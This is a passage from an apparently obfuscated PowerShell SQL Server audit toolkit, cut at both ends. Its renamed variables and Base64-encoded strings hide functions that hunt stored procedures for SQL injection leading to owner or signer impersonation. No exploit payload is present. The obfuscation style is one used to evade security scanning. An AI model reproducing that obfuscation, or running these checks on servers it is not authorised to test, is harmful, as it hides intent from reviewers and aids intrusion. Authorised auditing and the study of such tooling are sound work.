        ${_/=\/\_/=====\/\_} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBUAEEAUgBUACAAVgBVAEwATgBFAFIAQQBCAEkATABJAFQAWQAgAEMASABFAEMASwA6ACAAWwBWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAATgBBAE0ARQBdAA==')))
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not ${__/\_/=\/==\_/=\_})
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAEYAQQBJAEwARQBEAC4A')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABbAFYAVQBMAE4ARQBSAEEAQgBJAEwASQBUAFkAIABOAEEATQBFAF0ALgA=')))
            Return
        }
        else
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAFMAVQBDAEMARQBTAFMALgA=')))
        }
        ${_/==\_/==\___/\_/} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential
        ${/=\_/==\__/\/\_/=} = ${_/==\_/==\___/\_/}.CurrentLogin
        $ComputerName = ${_/==\_/==\___/\_/}.ComputerName
        if($Exploit)
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        ${/=\/====\_/\/===\} = ''
        ${__/\/\_______/==\}   = ''
        ${____/\__/===\/===}   = ''
        ${/=\_/=\_/=\_/\/=\}      = ''
        ${____/=\_/=\___/=\}  = 'No'
        ${___/=\/=\_/=\_/==} = 'No'
        ${__/\/\_/==\/==\/\}     = 'No'
        ${_____/\/========\}    = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAHUAcgByAGUAbgB0AEMAbwBtAG0AYQBuAGQAXQAgAC0ASQBuAHMAdABhAG4AYwBlACAAJABJAG4AcwB0AGEAbgBjAGUAIAAtAEUAeABwAGwAbwBpAHQA')))
        ${/=\/=\_/\/\/\/\_/}       = ''
        ${______/=\/==\/===}     = ''
        ${_/\____/\/==\/\/\}        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAHIAcwB0ACAATABhAHMAdAAgACgAVAB3AGkAdAB0AGUAcgApACwAIABDAG8AbQBwAGEAbgB5ACAAWQBlAGEAcgA=')))
        $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABbAFYAVQBMAE4ARQBSAEEAQgBJAEwASQBUAFkAIABOAEEATQBFAF0A')))
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return ${_/=\/\_/=====\/\_}
        }
    }
}

Function Invoke-SQLAuditSQLiSpExecuteAs
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        ${_/=\/\_/=====\/\_} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBUAEEAUgBUACAAVgBVAEwATgBFAFIAQQBCAEkATABJAFQAWQAgAEMASABFAEMASwA6ACAAUABvAHQAZQBuAHQAaQBhAGwAIABTAFEATAAgAEkAbgBqAGUAYwB0AGkAbwBuACAALQAgAEUAWABFAEMAVQBUAEUAIABBAFMAIABPAFcATgBFAFIA')))
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not ${__/\_/=\/==\_/=\_})
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAEYAQQBJAEwARQBEAC4A')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABQAG8AdABlAG4AdABpAGEAbAAgAFMAUQBMACAASQBuAGoAZQBjAHQAaQBvAG4AIAAtACAARQBYAEUAQwBVAFQARQAgAEEAUwAgAE8AVwBOAEUAUgAuAA==')))
            Return
        }
        ${_/==\_/==\___/\_/} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/=\_/==\__/\/\_/=} = ${_/==\_/==\___/\_/}.CurrentLogin
        $ComputerName = ${_/==\_/==\___/\_/}.ComputerName
        if($Exploit)
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        ${/=\/====\_/\/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHQAZQBuAHQAaQBhAGwAIABTAFEATAAgAEkAbgBqAGUAYwB0AGkAbwBuACAALQAgAEUAWABFAEMAVQBUAEUAIABBAFMAIABPAFcATgBFAFIA')))
        ${__/\/\_______/==\}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABhAGYAZgBlAGMAdABlAGQAIABwAHIAbwBjAGUAZAB1AHIAZQAgAGkAcwAgAHUAcwBpAG4AZwAgAGQAeQBuAGEAbQBpAGMAIABTAFEATAAgAGEAbgBkACAAdABoAGUAIAAiAEUAWABFAEMAVQBUAEUAIABBAFMAIABPAFcATgBFAFIAIgAgAGMAbABhAHUAcwBlAC4AIAAgAEEAcwAgAGEAIAByAGUAcwB1AGwAdAAsACAAaQB0ACAAbQBhAHkAIABiAGUAIABwAG8AcwBzAGkAYgBsAGUAIAB0AG8AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIAB0AGgAZQAgAHAAcgBvAGMAZQBkAHUAcgBlACAAbwB3AG4AZQByACAAaQBmACAAUwBRAEwAIABpAG4AagBlAGMAdABpAG8AbgAgAGkAcwAgAHAAbwBzAHMAaQBiAGwAZQAuAA==')))
        ${____/\__/===\/===}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBpAGQAZQByACAAdQBzAGkAbgBnACAAcABhAHIAYQBtAGUAdABlAHIAaQB6AGUAZAAgAHEAdQBlAHIAaQBlAHMAIABpAG4AcwB0AGUAYQBkACAAbwBmACAAYwBvAG4AYwBhAHQAZQBuAGEAdABlAGQAIABzAHQAcgBpAG4AZwBzACwAIABhAG4AZAAgAHUAcwBlACAAcwBpAGcAbgBlAGQAIABwAHIAbwBjAGUAZAB1AHIAZQBzACAAaQBuAHMAdABlAGEAZAAgAG8AZgAgAHQAaABlACAAIgBFAFgARQBDAFUAVABFACAAQQBTACAATwBXAE4ARQBSACIAIABjAGwAYQB1AHMAZQAuAA==')))
        ${/=\_/=\_/=\_/\/=\}      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaAA=')))
        ${____/=\_/=\___/=\}  = 'No'
        ${___/=\/=\_/=\_/==} = 'No'
        ${__/\/\_/==\/==\/\}     = 'No'
        ${_____/\/========\}    = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAYQB1AHQAbwBtAGEAdABlAGQAIABlAHgAcABsAG8AaQB0AGEAdABpAG8AbgAgAG8AcAB0AGkAbwBuACAAaABhAHMAIABiAGUAZQBuACAAcAByAG8AdgBpAGQAZQBkACwAIABiAHUAdAAgAHQAbwAgAHYAaQBlAHcAIAB0AGgAZQAgAHAAcgBvAGMAZQBkAHUAcgBlACAAYwBvAGQAZQAgAHUAcwBlADoAIABHAGUAdAAtAFMAUQBMAFMAdABvAHIAZQBkAFAAcgBvAGMAZQBkAHUAcgBlAFMAUQBMAGkAIAAtAFYAZQByAGIAbwBzAGUAIAAtAEkAbgBzAHQAYQBuAGMAZQAgACQASQBuAHMAdABhAG4AYwBlACAALQBLAGUAeQB3AG8AcgBkACAAIgBFAFgARQBDAFUAVABFACAAQQBTACAATwBXAE4ARQBSACIAJwA=')))
        ${/=\/=\_/\/\/\/\_/}       = ''
        ${______/=\/==\/===}     = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGIAbABvAGcALgBuAGUAdABzAHAAaQAuAGMAbwBtAC8AaABhAGMAawBpAG4AZwAtAHMAcQBsAC0AcwBlAHIAdgBlAHIALQBzAHQAbwByAGUAZAAtAHAAcgBvAGMAZQBkAHUAcgBlAHMALQBwAGEAcgB0AC0AMwAtAHMAcQBsAGkALQBhAG4AZAAtAHUAcwBlAHIALQBpAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuAA==')))
        ${_/\____/\/==\/\/\}        = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAG8AdAB0ACAAUwB1AHQAaABlAHIAbABhAG4AZAAgACgAQABfAG4AdQBsAGwAYgBpAG4AZAApACwAIABOAGUAdABTAFAASQAgADIAMAAxADYA')))
        ${/==\/\_/\_/\_/===} = Get-SQLStoredProcedureSQLi -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Keyword $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwBVAFQARQAgAEEAUwAgAE8AVwBOAEUAUgA='))) 
        if(${/==\/\_/\_/\_/===}.rows.count -ge 1){
            ${____/=\_/=\___/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
            ${___/=\/=\_/=\_/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA=')))
            ${/==\/\_/\_/\_/===} |
            %{
                $DatabaseName = $_.DatabaseName 
                $SchemaName = $_.SchemaName
                $ProcedureName = $_.ProcedureName
                ${_/==\_/\/==\____/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABEAGEAdABhAGIAYQBzAGUATgBhAG0AZQAuACQAUwBjAGgAZQBtAGEATgBhAG0AZQAuACQAUAByAG8AYwBlAGQAdQByAGUATgBhAG0AZQA=')))
                ${/=\/=\_/\/\/\/\_/} =  $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIAAkAHsAXwAvAD0APQBcAF8ALwBcAC8APQA9AFwAXwBfAF8AXwAvAH0AIABzAHQAbwByAGUAZAAgAHAAcgBvAGMAZQBkAHUAcgBlACAAaQBzACAAYQBmAGYAZQBjAHQAZQBkAC4A')))
                $null = ${_/=\/\_/=====\/\_}.Rows.Add($ComputerName, $Instance, ${/=\/====\_/\/===\}, ${__/\/\_______/==\}, ${____/\__/===\/===}, ${/=\_/=\_/=\_/\/=\}, ${____/=\_/=\___/=\}, ${___/=\/=\_/=\_/==}, ${__/\/\_/==\/==\/\}, ${_____/\/========\}, ${/=\/=\_/\/\/\/\_/}, ${______/=\/==\/===}, ${_/\____/\/==\/\/\})        
            }
        }    
        if($Exploit){
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAATgBvACAAYQB1AHQAbwBtAGEAdABpAGMAIABlAHgAcABsAG8AaQB0AGEAdABpAG8AbgAgAG8AcAB0AGkAbwBuACAAaABhAHMAIABiAGUAZQBuACAAcAByAG8AdgBpAGQAZQBkAC4AIABVAG4AaQBuAGYAbwByAG0AZQBkACAAZQB4AHAAbABvAGkAdABhAHQAaQBvAG4AIABvAGYAIABTAFEATABpACAAYwBhAG4AIABoAGEAdgBlACAAYQAgAG4AZQBnAGEAdABpAHYAZQAgAGkAbQBwAGEAYwB0ACAAbwBuACAAcAByAG8AZAB1AGMAdABpAG8AbgAgAGUAbgB2AGkAcgBvAG4AbQBlAG4AdABzAC4A')))
        }
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABQAG8AdABlAG4AdABpAGEAbAAgAFMAUQBMACAASQBuAGoAZQBjAHQAaQBvAG4AIAAtACAARQBYAEUAQwBVAFQARQAgAEEAUwAgAE8AVwBOAEUAUgA=')))
    }
    End
    {
        if ( -not $NoOutput)
        {
            Return ${_/=\/\_/=====\/\_}
        }
    }
}
Function Invoke-SQLAuditSQLiSpSigned
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )
    Begin
    {
        ${_/=\/\_/=====\/\_} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgB1AGwAbgBlAHIAYQBiAGkAbABpAHQAeQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AZQBkAGkAYQB0AGkAbwBuAA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHYAZQByAGkAdAB5AA=='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFYAdQBsAG4AZQByAGEAYgBsAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEUAeABwAGwAbwBpAHQAYQBiAGwAZQA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABlAGQA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdABDAG0AZAA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAYQBpAGwAcwA='))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUA'))))
        $null = ${_/=\/\_/=====\/\_}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIA'))))
    }
    Process
    {
        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBUAEEAUgBUACAAVgBVAEwATgBFAFIAQQBCAEkATABJAFQAWQAgAEMASABFAEMASwA6ACAAUABvAHQAZQBuAHQAaQBhAGwAIABTAFEATAAgAEkAbgBqAGUAYwB0AGkAbwBuACAALQAgAFMAaQBnAG4AZQBkACAAYgB5ACAAQwBlAHIAdABpAGYAaQBjAGEAdABlACAATABvAGcAaQBuAA==')))
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(-not ${__/\_/=\/==\_/=\_})
        {
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE4ATgBFAEMAVABJAE8ATgAgAEYAQQBJAEwARQBEAC4A')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBPAE0AUABMAEUAVABFAEQAIABWAFUATABOAEUAUgBBAEIASQBMAEkAVABZACAAQwBIAEUAQwBLADoAIABQAG8AdABlAG4AdABpAGEAbAAgAFMAUQBMACAASQBuAGoAZQBjAHQAaQBvAG4AIAAtACAAUwBpAGcAbgBlAGQAIABiAHkAIABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABMAG8AZwBpAG4ALgA=')))
            Return
        }
        ${_/==\_/==\___/\_/} = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/=\_/==\__/\/\_/=} = ${_/==\_/==\___/\_/}.CurrentLogin
        $ComputerName = ${_/==\_/==\___/\_/}.ComputerName
        if($Exploit)
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbABvAGkAdAA=')))
        }
        else
        {
            ${/=\/=\/\/\_______}  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AA==')))
        }
        ${/=\/====\_/\/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHQAZQBuAHQAaQBhAGwAIABTAFEATAAgAEkAbgBqAGUAYwB0AGkAbwBuACAALQAgAFMAaQBnAG4AZQBkACAAYgB5ACAAQwBlAHIAdABpAGYAaQBjAGEAdABlACAATABvAGcAaQBuAA==')))
        ${__/\/\_______/==\}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABhAGYAZgBlAGMAdABlAGQAIABwAHIAbwBjAGUAZAB1AHIAZQAgAGkAcwAgAHUAcwBpAG4AZwAgAGQAeQBuAGEAbQBpAGMAIABTAFEATAAgAGEAbgBkACAAaABhAHMAIABiAGUAZQBuACAAcwBpAGcAbgBlAGQAIABiAHkAIABhACAAYwBlAHIAdABpAGYAaQBjAGEAdABlACAAbABvAGcAaQBuAC4AIAAgAEEAcwAgAGEAIAByAGUAcwB1AGwAdAAsACAAaQB0ACAAbQBhAHkAIABiAGUAIABwAG8AcwBzAGkAYgBsAGUAIAB0AG8AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIABzAGkAZwBuAGUAcgAgAGkAZgAgAFMAUQBMACAAaQBuAGoAZQBjAHQAaQBvAG4AIABpAHMAIABwAG8AcwBzAGkAYgBsAGUALgA=')))
        ${____/\__/===\/===}   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBpAGQAZQByACAAdQBzAGkAbgBnACAAcABhAHIAYQBtAGUAdABlAHIAaQB6AGUAZAAgAHEAdQBlAHIAaQBlAHMAIABpAG4AcwB0AGUAYQBkACAAbwBmACAAYwBvAG4AYwBhAHQAZQBuAGEAdABlAGQAIABzAHQAcgBpAG4AZwBzAC4A')))
        ${/=\_/=\_/=\_/\/=\}      = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaAA=')))
        ${____/=\_/=\___/=\}  = 'No'
        ${___/=\/=\_/=\_/==} = 'No'
        ${__/\/\_/==\/==\/\}     = 'No'
        ${_____/\/========\}    = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAYQB1AHQAbwBtAGEAdABlAGQAIABlAHgAcABsAG8AaQB0AGEAdABpAG8AbgAgAG8AcAB0AGkAbwBuACAAaABhAHMAIABiAGUAZQBuACAAcAByAG8AdgBpAGQAZQBkACwAIABiAHUAdAAgAHQAbwAgAHYAaQBlAHcAIAB0AGgAZQAgAHAAcgBvAGMAZQBkAHUAcgBlACAAYwBvAGQAZQAgAHUAcwBlADoAIABHAGUAdAAtAFMAUQBMAFMAdABvAHIAZQBkAFAAcgBvAGMAZQBkAHUAcgBlAFMAUQBMAGkAIAAtAFYAZQByAGIAbwBzAGUAIAAtAEkAbgBzAHQAYQBuAGMAZQAgACQASQBuAHMAdABhAG4AYwBlACAALQBPAG4AbAB5AFMAaQBnAG4AZQBkAA==')))
        ${/=\/=\_/\/\/\/\_/}       = ''
